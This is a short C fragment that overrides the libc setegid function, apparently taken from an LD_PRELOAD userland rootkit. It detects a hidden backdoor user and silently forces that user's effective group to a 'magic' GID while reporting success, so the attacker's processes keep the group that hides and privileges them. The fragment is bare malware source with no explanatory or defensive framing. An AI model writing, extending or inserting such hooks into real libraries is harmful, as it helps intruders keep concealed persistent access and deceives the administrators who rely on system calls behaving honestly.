int setegid(gid_t egid){
    hook(CSETEGID);
    if(is_bdusr()){
        if(egid != MAGIC_GID)
            call(CSETEGID, MAGIC_GID);
        return 0;
    }
    return (long)call(CSETEGID, egid);
}
